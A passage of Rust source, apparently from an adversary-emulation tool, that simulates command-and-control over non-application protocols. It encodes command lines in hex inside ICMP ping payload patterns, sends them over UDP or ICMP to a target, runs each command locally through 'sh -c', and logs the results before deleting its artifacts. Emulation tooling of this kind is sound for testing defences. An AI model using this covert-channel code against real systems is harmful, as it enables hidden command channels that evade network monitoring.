                                    writeln!(log_file_handle, "    Response: {stdout}").unwrap();
                                }
                                
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
                                }
                                
                                // Also execute the command locally to get a realistic response
                                let local_output = Command::new("sh")
                                    .arg("-c")
                                    .arg(cmd)
                                    .output()
                                    .await;
                                    
                                match local_output {
                                    Ok(local_result) => {
                                        let local_stdout = String::from_utf8_lossy(&local_result.stdout);
                                        if !local_stdout.is_empty() {
                                            let preview = if local_stdout.len() > 200 {
                                                format!("{}... (truncated)", &local_stdout[0..200])
                                            } else {
                                                local_stdout.to_string()
                                            };
                                            writeln!(log_file_handle, "    Local execution result: {preview}").unwrap();
                                        }
                                    },
                                    Err(e) => {
                                        writeln!(log_file_handle, "    Local execution failed: {e}").unwrap();
                                    }
                                }
                                
                                successful_commands += 1;
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "    UDP transmission failed: {e}").unwrap();
                            }
                        }
                        
                        // Add delay between packets to avoid flooding
                        sleep(Duration::from_millis(200)).await;
                    }
                    
                    writeln!(log_file_handle, "\nC2 communication complete - {}/{} commands transmitted via actual UDP packets", 
                        successful_commands, command_lines.len()).unwrap();
                },
                "icmp" => {
                    writeln!(log_file_handle, "\n## ICMP-based C2 - Actual Network Traffic").unwrap();
                    
                    writeln!(log_file_handle, "Sending ICMP packets for C2 communication with {target}...").unwrap();
                    let mut successful_commands = 0;
                    
                    for (i, cmd) in command_lines.iter().enumerate() {
                        // Encode command in hex for ICMP data section
                        let hex_cmd = hex::encode(cmd.as_bytes());
                        let trunc_hex = if hex_cmd.len() > 32 { 
                            // ICMP pattern is 16 bytes (32 hex characters) max
                            hex_cmd[0..32].to_string() 
                        } else { 
                            // Pad with zeros if needed
                            format!("{hex_cmd:0<32}")
                        };
                        
                        writeln!(log_file_handle, "[{}] Sending command via ICMP: {}", i + 1, cmd).unwrap();
                        writeln!(log_file_handle, "    TX ICMP Packet: {} bytes - pattern 0x{}", cmd.len(), trunc_hex).unwrap();
                        
                        // Actually send ICMP ping with data pattern
                        let output = Command::new("ping")
                            .arg("-c")
                            .arg("1")  // Send 1 packet
                            .arg("-p")  // Pattern to fill packet
                            .arg(&trunc_hex)
                            .arg(&target)
                            .output()
                            .await;
                            
                        match output {
                            Ok(result) => {
                                let exit_status = result.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&result.stdout);
                                let stderr = String::from_utf8_lossy(&result.stderr);
                                
                                writeln!(log_file_handle, "    Command Status: {exit_status}").unwrap();
                                
                                if exit_status == 0 {
                                    successful_commands += 1;
                                }
                                
                                if !stdout.is_empty() {
                                    let summary = if stdout.len() > 200 {
                                        format!("{}... (truncated)", &stdout[0..200])
                                    } else {
                                        stdout.to_string()
                                    };
                                    writeln!(log_file_handle, "    Response: {summary}").unwrap();
                                }
                                
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
                                }
                                
                                // Also execute the command locally to get a realistic response
                                let local_output = Command::new("sh")
                                    .arg("-c")
                                    .arg(cmd)
                                    .output()
                                    .await;
                                    
                                match local_output {
                                    Ok(local_result) => {
                                        let local_stdout = String::from_utf8_lossy(&local_result.stdout);
                                        if !local_stdout.is_empty() {
                                            let preview = if local_stdout.len() > 200 {
                                                format!("{}... (truncated)", &local_stdout[0..200])
                                            } else {
                                                local_stdout.to_string()
                                            };
                                            writeln!(log_file_handle, "    Local execution result: {preview}").unwrap();
                                        }
                                    },
                                    Err(e) => {
                                        writeln!(log_file_handle, "    Local execution failed: {e}").unwrap();
                                    }
                                }
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "    ICMP transmission failed: {e}").unwrap();
                            }
                        }
                        
                        // Add delay between packets to avoid flooding
                        sleep(Duration::from_millis(300)).await;
                    }
                    
                    writeln!(log_file_handle, "\nC2 communication complete - {}/{} commands transmitted via actual ICMP packets", 
                        successful_commands, command_lines.len()).unwrap();
                },
                _ => {
                    writeln!(log_file_handle, "\n## ERROR: Unsupported protocol '{protocol}'").unwrap();
                    writeln!(log_file_handle, "Supported protocols: tcp, udp, icmp").unwrap();
                }
            }
            
            writeln!(log_file_handle, "\nC2 communication simulation complete.").unwrap();
            
            // Close log file
            drop(log_file_handle);
            
            info!("Non-application layer protocol C2 simulation complete, logs saved to {log_file}");
            
            Ok(SimulationResult {
                technique_id: technique_info.id,
                success: true,
                message: format!("Non-application layer protocol C2 simulation completed. Protocol: {protocol}, Logs: {log_file}"),
                artifacts: vec![log_file.to_string(), command_file.to_string()],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = std::fs::remove_file(artifact) {
                        error!("Failed to remove artifact {artifact}: {e}");
                    } else {
                        debug!("Removed artifact: {artifact}");
                    }
                }
            }
            Ok(())
        })
    }
}